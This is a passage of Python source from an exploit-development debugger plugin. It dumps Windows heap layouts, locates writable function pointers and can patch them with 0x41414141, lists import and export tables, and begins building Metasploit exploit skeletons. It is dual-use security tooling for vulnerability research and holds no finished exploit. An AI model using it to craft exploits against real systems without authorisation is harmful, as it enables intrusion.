                                if ((flindex > 1) and (int(bitmapstr[flindex]) != flindicator)):
                                    dbg.log(('     ** FreeListsInUseBitmap mismatch for index %d! **' % flindex), highlight=True)
                            flindex += 1
                    if ((searchtype == 'layout') or (searchtype == 'all')):
                        segments = getSegmentsForHeap(heapbase)
                        sortedsegments = []
                        global vtableCache
                        vtableCache = dbg.getKnowledge('vtableCache')
                        if (vtableCache is None):
                            vtableCache = {}
                        for seg in segments:
                            sortedsegments.append(seg)
                        if (not win7mode):
                            sortedsegments.sort()
                        segmentcnt = 0
                        minstringlen = minstringlength
                        blockmem = []
                        nr_filter_matches = 0
                        vablocks = []
                        vachunks = mHeap.getVirtualAllocdBlocks()
                        infoblocks = {}
                        infoblocks['segments'] = sortedsegments
                        if expand:
                            infoblocks['virtualallocdblocks'] = [vachunks]
                        for infotype in infoblocks:
                            heapdata = infoblocks[infotype]
                            for thisdata in heapdata:
                                if (infotype == 'segments'):
                                    seg = thisdata
                                    segmentcnt += 1
                                    segstart = segments[seg][0]
                                    segend = segments[seg][1]
                                    FirstEntry = segments[seg][2]
                                    LastValidEntry = segments[seg][3]
                                    datablocks = walkSegment(FirstEntry, LastValidEntry, heapbase)
                                    tolog = ('----- Heap 0x%08x%s, Segment 0x%08x - 0x%08x (%d/%d) -----' % (heapbase, heapbase_extra, segstart, segend, segmentcnt, len(sortedsegments)))
                                if (infotype == 'virtualallocdblocks'):
                                    datablocks = heapdata[0]
                                    tolog = ('----- Heap 0x%08x%s, VirtualAllocdBlocks : %d' % (heapbase, heapbase_extra, len(datablocks)))
                                logfile_l.write(' ', thislog_l)
                                dbg.log(tolog)
                                logfile_l.write(tolog, thislog_l)
                                sortedblocks = []
                                for block in datablocks:
                                    sortedblocks.append(block)
                                sortedblocks.sort()
                                for block in sortedblocks:
                                    showinlog = False
                                    thischunk = datablocks[block]
                                    unused = thischunk.unused
                                    headersize = thischunk.headersize
                                    flags = getHeapFlag(thischunk.flag)
                                    userptr = (block + headersize)
                                    psize = (thischunk.prevsize * 8)
                                    blocksize = (thischunk.size * 8)
                                    selfsize = blocksize
                                    usersize = (selfsize - unused)
                                    usersize = (blocksize - unused)
                                    extratxt = ''
                                    if (infotype == 'virtualallocdblocks'):
                                        selfsize = (thischunk.commitsize * 8)
                                        blocksize = selfsize
                                        usersize = (selfsize - unused)
                                        nextblock = thischunk.flink
                                    blockmem = dbg.readMemory(block, blocksize)
                                    asciistrings = {}
                                    unicodestrings = {}
                                    bstr = {}
                                    objects = {}
                                    asciistrings = getAllStringOffsets(blockmem, minstringlen)
                                    remaining = {}
                                    curpos = 0
                                    for stringpos in asciistrings:
                                        if (stringpos > curpos):
                                            remaining[curpos] = (stringpos - curpos)
                                            curpos = asciistrings[stringpos]
                                    if (curpos < blocksize):
                                        remaining[curpos] = blocksize
                                    for remstart in remaining:
                                        remend = remaining[remstart]
                                        thisunicodestrings = getAllUnicodeStringOffsets(blockmem[remstart:remend], minstringlen, remstart)
                                        for tus in thisunicodestrings:
                                            unicodestrings[tus] = thisunicodestrings[tus]
                                    tomove = []
                                    for unicodeoffset in unicodestrings:
                                        delta = unicodeoffset
                                        size = ((unicodestrings[unicodeoffset] - unicodeoffset) / 2)
                                        if (delta >= 4):
                                            maybesize = struct.unpack('<L', blockmem[(delta - 3):(delta + 1)])[0]
                                            if (maybesize == (size * 2)):
                                                tomove.append(unicodeoffset)
                                                bstr[unicodeoffset] = unicodestrings[unicodeoffset]
                                    for todel in tomove:
                                        del unicodestrings[todel]
                                    objects = {}
                                    orderedobj = []
                                    if (__DEBUGGERAPP__ == 'WinDBG'):
                                        nrlines = int((float(blocksize) / 4))
                                        cmd2run = ('dds 0x%08x L 0x%x' % ((block + headersize), nrlines))
                                        output = dbg.nativeCommand(cmd2run)
                                        outputlines = output.split('\n')
                                        for line in outputlines:
                                            if ((line.find('::') > (- 1)) and (line.find('vftable') > (- 1))):
                                                parts = line.split(' ')
                                                objconstr = ''
                                                if (len(parts) > 3):
                                                    objectptr = hexStrToInt(parts[0])
                                                    cnt = 2
                                                    objectinfo = ''
                                                    while (cnt < len(parts)):
                                                        objectinfo += (parts[cnt] + ' ')
                                                        cnt += 1
                                                    parts2 = line.split('::')
                                                    parts2name = ''
                                                    pcnt = 0
                                                    while (pcnt < (len(parts2) - 1)):
                                                        parts2name = ((parts2name + '::') + parts2[pcnt])
                                                        pcnt += 1
                                                    parts3 = parts2name.split(' ')
                                                    if (len(parts3) > 3):
                                                        objconstr = parts3[3]
                                                    if (not (objectptr in objects)):
                                                        objects[(objectptr - block)] = [objectinfo, objconstr]
                                                    objsize = 0
                                                    if findvtablesize:
                                                        if (not (objconstr in vtableCache)):
                                                            cmd2run = ('u %s::CreateElement L 12' % objconstr)
                                                            objoutput = dbg.nativeCommand(cmd2run)
                                                            if (not ('HeapAlloc' in objoutput)):
                                                                cmd2run = ('x %s::operator*' % objconstr)
                                                                oplist = dbg.nativeCommand(cmd2run)
                                                                oplines = oplist.split('\n')
                                                                oppat = ('%s::operator' % objconstr)
                                                                for opline in oplines:
                                                                    if ((oppat in opline) and (not ('del' in opline))):
                                                                        lineparts = opline.split(' ')
                                                                        cmd2run = ('uf %s' % lineparts[0])
                                                                        objoutput = dbg.nativeCommand(cmd2run)
                                                                        break
                                                            if ('HeapAlloc' in objoutput):
                                                                objlines = objoutput.split('\n')
                                                                lineindex = 0
                                                                for objline in objlines:
                                                                    if ('HeapAlloc' in objline):
                                                                        if (lineindex >= 3):
                                                                            sizeline = objlines[(lineindex - 3)]
                                                                            if ('push' in sizeline):
                                                                                sizelineparts = sizeline.split('push')
                                                                                if (len(sizelineparts) > 1):
                                                                                    sizevalue = sizelineparts[(len(sizelineparts) - 1)].replace(' ', '').replace('h', '')
                                                                                    try:
                                                                                        objsize = hexStrToInt(sizevalue)
                                                                                        remainsize = (objsize - ((objsize / 8) * 8))
                                                                                        while (remainsize != 0):
                                                                                            objsize += 1
                                                                                            remainsize = (objsize - ((objsize / 8) * 8))
                                                                                    except:
                                                                                        objsize = 0
                                                                                break
                                                                    lineindex += 1
                                                            vtableCache[objconstr] = objsize
                                                        else:
                                                            objsize = vtableCache[objconstr]
                                    allobjects = []
                                    objectstodelete = []
                                    for optr in objects:
                                        allobjects.append(optr)
                                    allobjects.sort()
                                    skipuntil = 0
                                    for optr in allobjects:
                                        if (optr < skipuntil):
                                            objectstodelete.append(optr)
                                        else:
                                            objname = objects[optr][1]
                                            objsize = 0
                                            try:
                                                objsize = vtableCache[objname]
                                            except:
                                                objsize = 0
                                            skipuntil = (optr + objsize)
                                    minvtabledistance = 12
                                    prevvname = ''
                                    prevptr = 0
                                    thisvname = ''
                                    for optr in allobjects:
                                        thisvname = objects[optr][1]
                                        if ((thisvname == prevvname) and ((optr - prevptr) <= minvtabledistance)):
                                            if (not (optr in objectstodelete)):
                                                objectstodelete.append(optr)
                                        else:
                                            prevptr = optr
                                            prevvname = thisvname
                                    for vtableptr in objectstodelete:
                                        del objects[vtableptr]
                                    for obj in objects:
                                        orderedobj.append(obj)
                                    for ascstring in asciistrings:
                                        orderedobj.append(ascstring)
                                    for unicodestring in unicodestrings:
                                        orderedobj.append(unicodestring)
                                    for bstrobj in bstr:
                                        orderedobj.append(bstrobj)
                                    orderedobj.sort()
                                    chunkprefix = ''
                                    fieldname1 = 'Usersize'
                                    fieldname2 = 'ChunkSize'
                                    if (infotype == 'virtualallocdblocks'):
                                        chunkprefix = 'VA '
                                        fieldname1 = 'CommitSize'
                                    tolog = ('%sChunk 0x%08x (%s 0x%x, %s 0x%x) : %s' % (chunkprefix, block, fieldname1, usersize, fieldname2, (usersize + unused), flags))
                                    if showdata:
                                        dbg.log(tolog)
                                    logfile_l.write(tolog, thislog_l)
                                    previousptr = block
                                    previoussize = 0
                                    showinlog = False
                                    for ptr in orderedobj:
                                        ptrtype = ''
                                        ptrinfo = ''
                                        data = ''
                                        alldata = ''
                                        blockinfo = ''
                                        ptrbytes = 0
                                        endptr = 0
                                        datasize = 0
                                        ptrchars = 0
                                        infoptr = (block + ptr)
                                        endptr = 0
                                        if (ptr in asciistrings):
                                            ptrtype = 'String'
                                            dataend = asciistrings[ptr]
                                            data = blockmem[ptr:dataend]
                                            alldata = data
                                            ptrbytes = len(data)
                                            ptrchars = ptrbytes
                                            datasize = ptrbytes
                                            if (ptrchars > 100):
                                                data = (data[0:100] + '...')
                                            blockinfo = ('%s (Data : 0x%x/%d bytes, 0x%x/%d chars) : %s' % (ptrtype, ptrbytes, ptrbytes, ptrchars, ptrchars, data))
                                            infoptr = (block + ptr)
                                            endptr = ((infoptr + ptrchars) - 1)
                                        elif (ptr in bstr):
                                            ptrtype = 'BSTR'
                                            dataend = bstr[ptr]
                                            data = blockmem[ptr:dataend].replace('\x00', '')
                                            alldata = data
                                            ptrchars = len(data)
                                            ptrbytes = (ptrchars * 2)
                                            datasize = (ptrbytes + 6)
                                            infoptr = ((block + ptr) - 3)
                                            if (ptrchars > 100):
                                                data = (data[0:100] + '...')
                                            blockinfo = ('%s 0x%x/%d bytes (Data : 0x%x/%d bytes, 0x%x/%d chars) : %s' % (ptrtype, (ptrbytes + 6), (ptrbytes + 6), ptrbytes, ptrbytes, ptrchars, ptrchars, data))
                                            endptr = ((infoptr + ptrbytes) + 6)
                                        elif (ptr in unicodestrings):
                                            ptrtype = 'Unicode'
                                            dataend = unicodestrings[ptr]
                                            data = blockmem[ptr:dataend].replace('\x00', '')
                                            alldata = ''
                                            ptrchars = len(data)
                                            ptrbytes = (ptrchars * 2)
                                            datasize = ptrbytes
                                            if (ptrchars > 100):
                                                data = (data[0:100] + '...')
                                            blockinfo = ('%s (0x%x/%d bytes, 0x%x/%d chars) : %s' % (ptrtype, ptrbytes, ptrbytes, ptrchars, ptrchars, data))
                                            endptr = ((infoptr + ptrbytes) + 2)
                                        elif (ptr in objects):
                                            ptrtype = 'Object'
                                            data = objects[ptr][0]
                                            vtablename = objects[ptr][1]
                                            datasize = 0
                                            if (vtablename in vtableCache):
                                                datasize = vtableCache[vtablename]
                                            alldata = data
                                            if (datasize > 0):
                                                blockinfo = ('%s (0x%x bytes): %s' % (ptrtype, datasize, data))
                                            else:
                                                blockinfo = ('%s : %s' % (ptrtype, data))
                                            endptr = (infoptr + datasize)
                                        slackspace = (infoptr - previousptr)
                                        if ((endptr > 0) and (not (ptrtype == 'Object'))):
                                            if (slackspace >= 0):
                                                tolog = ('  +%04x @ %08x->%08x : %s' % (slackspace, infoptr, endptr, blockinfo))
                                            else:
                                                tolog = ('       @ %08x->%08x : %s' % (infoptr, endptr, blockinfo))
                                        elif (slackspace >= 0):
                                            if (endptr != infoptr):
                                                tolog = ('  +%04x @ %08x->%08x : %s' % (slackspace, infoptr, endptr, blockinfo))
                                            else:
                                                tolog = ('  +%04x @ %08x           : %s' % (slackspace, infoptr, blockinfo))
                                        else:
                                            tolog = ('        @ %08x           : %s' % (infoptr, blockinfo))
                                        if ((filterafter == '') or ((filterafter != '') and (filterafter in alldata))):
                                            showinlog = True
                                            if (filterafter != ''):
                                                nr_filter_matches += 1
                                        if showinlog:
                                            if showdata:
                                                dbg.log(tolog)
                                            logfile_l.write(tolog, thislog_l)
                                        previousptr = endptr
                                        previoussize = datasize
                        if (filterafter != ''):
                            tolog = ('Nr of filter matches: %d' % nr_filter_matches)
                            if showdata:
                                dbg.log('')
                                dbg.log(tolog)
                            logfile_l.write('', thislog_l)
                            logfile_l.write(tolog, thislog_l)
                        dbg.addKnowledge('vtableCache', vtableCache)
                    if ((searchtype in ['segments', 'all', 'chunks']) or ('stat' in args)):
                        segments = getSegmentsForHeap(heapbase)
                        dbg.log(('Segment List for heap 0x%08x:' % heapbase))
                        dbg.log('---------------------------------')
                        sortedsegments = []
                        for seg in segments:
                            sortedsegments.append(seg)
                        if (not win7mode):
                            sortedsegments.sort()
                        vablocks = []
                        vachunks = mHeap.getVirtualAllocdBlocks()
                        infoblocks = {}
                        infoblocks['segments'] = sortedsegments
                        if (searchtype in ['all', 'chunks']):
                            infoblocks['virtualallocdblocks'] = [vachunks]
                        for infotype in infoblocks:
                            heapdata = infoblocks[infotype]
                            for thisdata in heapdata:
                                tolog = ''
                                if (infotype == 'segments'):
                                    seg = thisdata
                                    segstart = segments[seg][0]
                                    segend = segments[seg][1]
                                    segsize = (segend - segstart)
                                    FirstEntry = segments[seg][2]
                                    LastValidEntry = segments[seg][3]
                                    tolog = ('Segment 0x%08x - 0x%08x (FirstEntry: 0x%08x - LastValidEntry: 0x%08x): 0x%08x bytes' % (segstart, segend, FirstEntry, LastValidEntry, segsize))
                                if (infotype == 'virtualallocdblocks'):
                                    vablocks = heapdata
                                    tolog = ('Heap : 0x%08x%s : VirtualAllocdBlocks : %d ' % (heapbase, heapbase_extra, len(vachunks)))
                                dbg.log(tolog)
                                if ((searchtype == 'chunks') or ('stat' in args)):
                                    try:
                                        logfile_b.write(('Heap: 0x%08x%s' % (heapbase, heapbase_extra)), thislog_b)
                                        logfile_b.write(tolog, thislog_b)
                                    except:
                                        pass
                                    if (infotype == 'segments'):
                                        datablocks = walkSegment(FirstEntry, LastValidEntry, heapbase)
                                    else:
                                        datablocks = heapdata[0]
                                    tolog = ('    Nr of chunks : %d ' % len(datablocks))
                                    dbg.log(tolog)
                                    try:
                                        logfile_b.write(tolog, thislog_b)
                                    except:
                                        pass
                                    if (len(datablocks) > 0):
                                        tolog = '    _HEAP_ENTRY  psize   size  unused  UserPtr   UserSize'
                                        dbg.log(tolog)
                                        try:
                                            logfile_b.write(tolog, thislog_b)
                                        except:
                                            pass
                                        sortedblocks = []
                                        for block in datablocks:
                                            sortedblocks.append(block)
                                        sortedblocks.sort()
                                        nextblock = 0
                                        segstatinfo = {}
                                        for block in sortedblocks:
                                            showinlog = False
                                            thischunk = datablocks[block]
                                            unused = thischunk.unused
                                            headersize = thischunk.headersize
                                            flagtxt = getHeapFlag(thischunk.flag)
                                            if ((not (infotype == 'virtualallocdblocks')) and ('virtallocd' in flagtxt.lower())):
                                                flagtxt += ' (LFH)'
                                                flagtxt = flagtxt.replace('Virtallocd', 'Internal')
                                            userptr = (block + headersize)
                                            psize = (thischunk.prevsize * 8)
                                            blocksize = (thischunk.size * 8)
                                            selfsize = blocksize
                                            usersize = (selfsize - unused)
                                            usersize = (blocksize - unused)
                                            extratxt = ''
                                            if (infotype == 'virtualallocdblocks'):
                                                nextblock = thischunk.flink
                                                extratxt = (' (0x%x bytes committed)' % (thischunk.commitsize * 8))
                                            else:
                                                nextblock = (block + blocksize)
                                            if (not ('stat' in args)):
                                                tolog = ('       %08x  %05x  %05x   %05x  %08x  %08x (%d) (%s) %s' % (block, psize, selfsize, unused, (block + headersize), usersize, usersize, flagtxt, extratxt))
                                                dbg.log(tolog)
                                                logfile_b.write(tolog, thislog_b)
                                            elif (not (usersize in segstatinfo)):
                                                segstatinfo[usersize] = 1
                                            else:
                                                segstatinfo[usersize] += 1
                                        if ((nextblock > 0) and (nextblock < LastValidEntry)):
                                            if (not ('stat' in args)):
                                                nextblock -= headersize
                                                restbytes = (LastValidEntry - nextblock)
                                                tolog = ('       0x%08x - 0x%08x (end of segment) : 0x%x (%d) uncommitted bytes' % (nextblock, LastValidEntry, restbytes, restbytes))
                                                dbg.log(tolog)
                                                logfile_b.write(tolog, thislog_b)
                                        if ('stat' in args):
                                            statinfo[segstart] = segstatinfo
                                            orderedsizes = []
                                            totalalloc = 0
                                            for thissize in segstatinfo:
                                                orderedsizes.append(thissize)
                                                totalalloc += segstatinfo[thissize]
                                            orderedsizes.sort(reverse=True)
                                            tolog = '    Segment Statistics:'
                                            dbg.log(tolog)
                                            try:
                                                logfile_b.write(tolog, thislog_b)
                                            except:
                                                pass
                                            for thissize in orderedsizes:
                                                nrblocks = segstatinfo[thissize]
                                                percentage = ((float(nrblocks) / float(totalalloc)) * 100)
                                                tolog = ('    Size : 0x%x (%d) : %d chunks (%.2f %%)' % (thissize, thissize, nrblocks, percentage))
                                                dbg.log(tolog)
                                                try:
                                                    logfile_b.write(tolog, thislog_b)
                                                except:
                                                    pass
                                            tolog = ('    Total chunks : %d' % totalalloc)
                                            dbg.log(tolog)
                                            try:
                                                logfile_b.write(tolog, thislog_b)
                                            except:
                                                pass
                                            tolog = ''
                                            try:
                                                logfile_b.write(tolog, thislog_b)
                                            except:
                                                pass
                                            dbg.log('')
                                        dbg.log('')
                if (('stat' in args) and (len(statinfo) > 0)):
                    tolog = 'Global statistics'
                    dbg.log(tolog)
                    try:
                        logfile_b.write(tolog, thislog_b)
                    except:
                        pass
                    globalstats = {}
                    allalloc = 0
                    for seginfo in statinfo:
                        segmentstats = statinfo[seginfo]
                        for size in segmentstats:
                            allalloc += segmentstats[size]
                            if (not (size in globalstats)):
                                globalstats[size] = segmentstats[size]
                            else:
                                globalstats[size] += segmentstats[size]
                    orderedstats = []
                    for size in globalstats:
                        orderedstats.append(size)
                    orderedstats.sort(reverse=True)
                    for thissize in orderedstats:
                        nrblocks = globalstats[thissize]
                        percentage = ((float(nrblocks) / float(allalloc)) * 100)
                        tolog = ('  Size : 0x%x (%d) : %d chunks (%.2f %%)' % (thissize, thissize, nrblocks, percentage))
                        dbg.log(tolog)
                        try:
                            logfile_b.write(tolog, thislog_b)
                        except:
                            pass
                    tolog = ('  Total chunks : %d' % allalloc)
                    dbg.log(tolog)
                    try:
                        logfile_b.write(tolog, thislog_b)
                    except:
                        pass
            return

        def procGetIAT(args):
            return procGetxAT(args, 'iat')

        def procGetEAT(args):
            return procGetxAT(args, 'eat')

        def procFwptr(args):
            modulecriteria = {}
            criteria = {}
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            modulestosearch = getModulesToQuery(modulecriteria)
            allpages = dbg.getMemoryPages()
            orderedpages = []
            for page in allpages.keys():
                orderedpages.append(page)
            orderedpages.sort()
            pagestoquery = {}
            fwptrs = {}
            objwptr = MnLog('wptr.txt')
            wptrfile = objwptr.reset()
            setbps = False
            dopatch = False
            dofreelist = False
            if ('bp' in args):
                setbps = True
            if ('patch' in args):
                dopatch = True
            if ('freelist' in args):
                dofreelist = True
            chunksize = 0
            offset = 0
            if ('chunksize' in args):
                if (type(args['chunksize']).__name__.lower() != 'bool'):
                    try:
                        if str(args['chunksize']).lower().startswith('0x'):
                            chunksize = int(args['chunksize'], 16)
                        else:
                            chunksize = int(args['chunksize'])
                    except:
                        chunksize = 0
                if ((chunksize == 0) or (chunksize > 65535)):
                    dbg.log('[!] Invalid chunksize specified')
                    if (chunksize > 65535):
                        dbg.log('[!] Chunksize must be <= 0xffff')
                        (chunksize == 0)
                        return
                else:
                    dbg.log(('[+] Will filter on chunksize 0x%0x' % chunksize))
            if dofreelist:
                if ('offset' in args):
                    if (type(args['offset']).__name__.lower() != 'bool'):
                        try:
                            if str(args['offset']).lower().startswith('0x'):
                                offset = int(args['offset'], 16)
                            else:
                                offset = int(args['offset'])
                        except:
                            offset = 0
                    if (offset == 0):
                        dbg.log('[!] Invalid offset specified')
                    else:
                        dbg.log(('[+] Will add 0x%0x bytes between flink/blink and fwptr' % offset))
            if (not silent):
                if setbps:
                    dbg.log('[+] Will set breakpoints on found CALL/JMP')
                if dopatch:
                    dbg.log('[+] Will patch target for CALL/JMP with 0x41414141')
                dbg.log(('[+] Extracting .text/.code sections from %d modules' % len(modulestosearch)))
                dbg.updateLog()
            if (len(modulestosearch) > 0):
                for thismodule in modulestosearch:
                    for thispage in orderedpages:
                        page = allpages[thispage]
                        pagestart = page.getBaseAddress()
                        pagesize = page.getSize()
                        ptr = MnPointer(pagestart)
                        mod = ''
                        sectionname = ''
                        try:
                            mod = ptr.belongsTo()
                            if (mod == thismodule):
                                sectionname = page.getSection()
                                if ((sectionname == '.text') or (sectionname == '.code')):
                                    pagestoquery[mod] = [pagestart, (pagestart + pagesize)]
                                    break
                        except:
                            pass
            if (len(pagestoquery) > 0):
                if (not silent):
                    dbg.log('[+] Analysing .text/.code sections')
                    dbg.updateLog()
                for modname in pagestoquery:
                    tmodcnt = 0
                    nr_sizematch = 0
                    pagestart = pagestoquery[modname][0]
                    pageend = pagestoquery[modname][1]
                    if (not silent):
                        dbg.log(('    - Carving through %s (0x%08x - 0x%08x)' % (modname, pagestart, pageend)))
                        dbg.updateLog()
                    loc = pagestart
                    while (loc < pageend):
                        try:
                            thisinstr = dbg.disasm(loc)
                            instrbytes = thisinstr.getDump()
                            if (thisinstr.isJmp() or thisinstr.isCall()):
                                instrtext = getDisasmInstruction(thisinstr)
                                opcodepart = instrbytes.upper()[0:4]
                                if ((opcodepart == 'FF15') or (opcodepart == 'FF25')):
                                    if (('[' in instrtext) and (']' in instrtext)):
                                        parts1 = instrtext.split('[')
                                        if (len(parts1) > 1):
                                            parts2 = parts1[1].split(']')
                                            addy = parts2[0]
                                            if (('(' in addy) and (')' in addy)):
                                                parts1 = addy.split('(')
                                                parts2 = parts1[1].split(')')
                                                addy = parts2[0]
                                            if isHexValue(addy):
                                                addyval = hexStrToInt(addy)
                                                access = getPointerAccess(addyval)
                                                if ('WRITE' in access):
                                                    if meetsCriteria(addyval, criteria):
                                                        savetolog = False
                                                        sizeinfo = ''
                                                        if (chunksize == 0):
                                                            savetolog = True
                                                        else:
                                                            sizeval = 0
                                                            if (not dofreelist):
                                                                sizeval = struct.unpack('<H', dbg.readMemory((addyval - 8), 2))[0]
                                                                if (sizeval >= chunksize):
                                                                    savetolog = True
                                                                    nr_sizematch += 1
                                                                    sizeinfo = (' Chunksize: %d (0x%02x) - ' % ((sizeval * 8), (sizeval * 8)))
                                                            else:
                                                                sizeval = struct.unpack('<H', dbg.readMemory(((addyval - 8) - offset), 2))[0]
                                                                flink = struct.unpack('<L', dbg.readMemory((addyval - offset), 4))[0]
                                                                blink = struct.unpack('<L', dbg.readMemory(((addyval + 4) - offset), 4))[0]
                                                                aflink = getPointerAccess(flink)
                                                                ablink = getPointerAccess(blink)
                                                                if (('READ' in aflink) and ('READ' in ablink)):
                                                                    extr = ''
                                                                    if ((sizeval == chunksize) or (sizeval == (chunksize + 1))):
                                                                        extr = ' **size match**'
                                                                        nr_sizematch += 1
                                                                    sizeinfo = (' Chunksize: %d (0x%02x)%s, UserPtr 0x%08x, Flink 0x%08x, Blink 0x%08x - ' % ((sizeval * 8), (sizeval * 8), extr, (addyval - offset), flink, blink))
                                                                    savetolog = True
                                                        if savetolog:
                                                            fwptrs[loc] = addyval
                                                            tmodcnt += 1
                                                            ptrx = MnPointer(addyval)
                                                            mod = ptrx.belongsTo()
                                                            tofile = ('0x%08x : 0x%08x gets called from %s at 0x%08x (%s) - %s%s' % (addyval, addyval, mod, loc, instrtext, sizeinfo, ptrx.__str__()))
                                                            objwptr.write(tofile, wptrfile)
                                                            if setbps:
                                                                dbg.setBreakpoint(loc)
                                                            if dopatch:
                                                                dbg.writeLong(addyval, 1094795585)
                            if (len(instrbytes) > 0):
                                loc = (loc + (len(instrbytes) / 2))
                            else:
                                loc = (loc + 1)
                        except:
                            loc = (loc + 1)
                    if (not silent):
                        dbg.log(('      Found %d pointers' % tmodcnt))
                        if (chunksize > 0):
                            dbg.log(('      %d pointers with size match' % nr_sizematch))
            return

        def procGetxAT(args, mode):
            keywords = []
            keywordstring = ''
            modulecriteria = {}
            criteria = {}
            thisxat = {}
            entriesfound = 0
            if ('s' in args):
                if (type(args['s']).__name__.lower() != 'bool'):
                    keywordstring = args['s'].replace("'", '').replace('"', '')
                    keywords = keywordstring.split(',')
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            modulestosearch = getModulesToQuery(modulecriteria)
            if (not silent):
                dbg.log(('[+] Querying %d modules' % len(modulestosearch)))
            if (len(modulestosearch) > 0):
                xatfilename = ('%ssearch.txt' % mode)
                objxatfilename = MnLog(xatfilename)
                xatfile = objxatfilename.reset()
                for thismodule in modulestosearch:
                    thismod = MnModule(thismodule)
                    if (mode == 'iat'):
                        thisxat = thismod.getIAT()
                    else:
                        thisxat = thismod.getEAT()
                    thismodule = thismod.getShortName()
                    for thisfunc in thisxat:
                        thisfuncname = thisxat[thisfunc].lower()
                        origfuncname = thisfuncname
                        firstindex = thisfuncname.find('.')
                        if (firstindex > 0):
                            thisfuncname = thisfuncname[(firstindex + 1):len(thisfuncname)]
                        addtolist = False
                        iatptr_modname = ''
                        modinfohr = ''
                        theptr = 0
                        if (mode == 'iat'):
                            theptr = struct.unpack('<L', dbg.readMemory(thisfunc, 4))[0]
                            ptrx = MnPointer(theptr)
                            iatptr_modname = ptrx.belongsTo()
                            if ((not (iatptr_modname == '')) and ('.' in iatptr_modname)):
                                iatptr_modparts = iatptr_modname.split('.')
                                iatptr_modname = iatptr_modparts[0]
                            if ((not ('.' in origfuncname)) and (iatptr_modname != '') and (not ('!' in origfuncname))):
                                origfuncname = ((iatptr_modname.lower() + '.') + origfuncname)
                                thisfuncname = origfuncname
                            if ('!' in origfuncname):
                                oparts = origfuncname.split('!')
                                origfuncname = ((iatptr_modname + '.') + oparts[1])
                                thisfuncname = origfuncname
                            try:
                                ModObj = MnModule(iatptr_modname)
                                modinfohr = (' - %s' % ModObj.__str__())
                            except:
                                modinfohr = ''
                                pass
                        if (len(keywords) > 0):
                            for keyword in keywords:
                                keyword = keyword.lower().strip()
                                if ((keyword.startswith('*') and keyword.endswith('*')) or (keyword.find('*') < 0)):
                                    keyword = keyword.replace('*', '')
                                    if (thisfuncname.find(keyword) > (- 1)):
                                        addtolist = True
                                        break
                                if (keyword.startswith('*') and (not keyword.endswith('*'))):
                                    keyword = keyword.replace('*', '')
                                    if thisfuncname.endswith(keyword):
                                        addtolist = True
                                        break
                                if (keyword.endswith('*') and (not keyword.startswith('*'))):
                                    keyword = keyword.replace('*', '')
                                    if thisfuncname.startswith(keyword):
                                        addtolist = True
                                        break
                        else:
                            addtolist = True
                        if addtolist:
                            entriesfound += 1
                            if (mode == 'iat'):
                                thedelta = (thisfunc - thismod.moduleBase)
                                logentry = ('At 0x%s in %s (base + 0x%s) : 0x%s (ptr to %s) %s' % (toHex(thisfunc), thismodule.lower(), toHex(thedelta), toHex(theptr), origfuncname, modinfohr))
                            else:
                                thedelta = (thisfunc - thismod.moduleBase)
                                logentry = ('0x%08x : %s!%s (0x%08x+0x%08x)' % (thisfunc, thismodule.lower(), origfuncname, thismod.moduleBase, thedelta))
                            dbg.log(logentry, address=thisfunc)
                            objxatfilename.write(logentry, xatfile)
                if (not silent):
                    dbg.log('')
                    dbg.log(('%d entries found' % entriesfound))
            return

        def procSkeleton(args):
            cyclicsize = 5000
            if ('c' in args):
                if (type(args['c']).__name__.lower() != 'bool'):
                    try:
                        cyclicsize = int(args['c'])
                    except:
                        cyclicsize = 5000
            exploittype = ''
            skeletonarg = ''
            usecliargs = False
            validstypes = {}
            validstypes['tcpclient'] = 'network client (tcp)'
            validstypes['udpclient'] = 'network client (udp)'
            validstypes['fileformat'] = 'fileformat'
            exploittypes = ['fileformat', 'network client (tcp)', 'network client (udp)']
            errorfound = False
            if ((__DEBUGGERAPP__ == 'WinDBG') or ('t' in args)):
                if ('t' in args):
                    if (type(args['t']).__name__.lower() != 'bool'):
                        skeltype = args['t'].lower()
                        skelparts = skeltype.split(':')
                        if (skelparts[0] in validstypes):
                            exploittype = validstypes[skelparts[0]]
                            if (len(skelparts) > 1):
                                skeletonarg = skelparts[1]
                            else:
                                errorfound = True
                            usecliargs = True
                        else:
                            errorfound = True
                    else:
                        errorfound = True
                else:
                    errorfound = True
            else:
                dbg.log(' ** Please select a skeleton exploit type from the dropdown list **', highlight=1)
                exploittype = dbg.comboBox('Select msf exploit skeleton to build :', exploittypes).lower().strip()
            if errorfound:
                dbg.log(' ** Please specify a valid skeleton type and argument **', highlight=1)
                dbg.log('    Valid types are : tcpclient:argument, udpclient:argument, fileformat:argument')
                dbg.log('    Example : skeleton for a pdf file format exploit: -t fileformat:pdf')
                dbg.log('              skeleton for tcp client against port 123: -t tcpclient:123')
                return
            if (not (exploittype in exploittypes)):
                dbg.log('Boo - invalid exploit type, try again !', highlight=1)
                return
            portnr = 0
            extension = ''
            if (exploittype.find('network') > (- 1)):
                if usecliargs:
                    portnr = skeletonarg
                else:
                    portnr = dbg.inputBox('Remote port number : ')
                try:
                    portnr = int(portnr)
                except:
                    portnr = 0
            if (exploittype.find('fileformat') > (- 1)):
                if usecliargs:
                    extension = skeletonarg
                else:
                    extension = dbg.inputBox('File extension :')
            extension = extension.replace("'", '').replace('"', '').replace('\n', '').replace('\r', '')
            if (not extension.startswith('.')):
                extension = ('.' + extension)
            exploitfilename = 'msfskeleton.rb'
            objexploitfile = MnLog(exploitfilename)
            global ignoremodules
            global noheader
            noheader = True
            ignoremodules = True
            exploitfile = objexploitfile.reset()
            ignoremodules = False
            noheader = False
            modulecriteria = {}
            criteria = {}
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            badchars = ''
            if ('badchars' in criteria):
                badchars = criteria['badchars']
            if ('nonull' in criteria):
                if (not ('\x00' in badchars)):
                    badchars += '\x00'
            (skeletonheader, skeletoninit, skeletoninit2) = getSkeletonHeader(exploittype, portnr, extension, '', badchars)
            targetstr = "      'Targets'    =>\n"
            targetstr += '        [\n'
            targetstr += "          [ '<fill in the OS/app version here>',\n"
            targetstr += '            {\n'
            targetstr += "              'Ret'     =>  0x00000000,\n"
            targetstr += "              'Offset'  =>  0\n"
            targetstr += '            }\n'
            targetstr += '          ],\n'
            targetstr += '        ],\n'
            exploitstr = '  def exploit\n\n'
            if (exploittype.find('network') > (- 1)):
                if (exploittype.find('tcp') > (- 1)):
                    exploitstr += '\n    connect\n\n'
                elif (exploittype.find('udp') > (- 1)):
                    exploitstr += '\n    connect_udp\n\n'
